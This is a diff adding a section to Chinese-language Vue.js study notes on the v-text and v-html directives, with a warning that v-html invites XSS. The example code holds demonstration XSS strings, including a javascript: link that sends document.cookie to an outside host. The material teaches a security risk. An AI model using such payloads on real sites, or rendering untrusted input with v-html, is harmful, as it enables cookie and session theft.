@@ -348,7 +348,7 @@ v-on事件修饰符来管理事件的行为
     </script>
 ```
 
-### 条件渲染 v-if&v-show
+### v-if&v-show
 
 条件渲染：
 
@@ -400,6 +400,50 @@ v-on事件修饰符来管理事件的行为
         })
     </script>
 ```
+### v-text&v-html
+
+v-text指令：
+-   作用：向其所在的节点中渲染文本内容。 (纯文本渲染不会加载成标签样式啥的)
+-   与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。这里有点不太灵活
+
+v-html指令：
+-   作用：向指定节点中渲染包含html结构的内容。
+-   与插值语法的区别：
+    -   v-html会替换掉节点中所有的内容，{{xx}}则不会。
+    -   v-html可以识别html结构。
+-   严重注意：v-html有安全性问题！！！！
+    -   在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+    -   一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+
+```javascript
+<div id="app">
+    {{name}}
+    <!--如果name没有标签样式,与上面展示一样的结果-->
+    <div v-text="name"></div>
+    <!--不展示 你好, 文字-->
+    <div v-text="name">你好，</div>
+    <div v-text="str"></div>
+    <!--会加载成标签,而不是纯文字-->
+    <div v-html="str"></div>
+    <div v-html="hackStr1"></div>
+    <div v-html="hackStr2"></div>
+    <div v-html="hackStr3"></div>
+</div>
+<script>
+    const vm = new Vue({
+        el: '#app',
+        data: {
+            name: '张三',
+            str: '<h2>哈哈哈</h2>',
+            hackStr1: '<a href=https://www.baidu.com>去百度一下把</a>',
+            hackStr2: '<a href=javascript:alert(1)>xss攻击</a>',
+            // 如果该cookie设置了httponly属性等于true,则无法通过js代码获取cookie信息
+            hackStr3: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>xdm冲啊</a>'
+        }
+    })
+</script>
+```
+
 ## 补充点
 ### el和data的写法
 
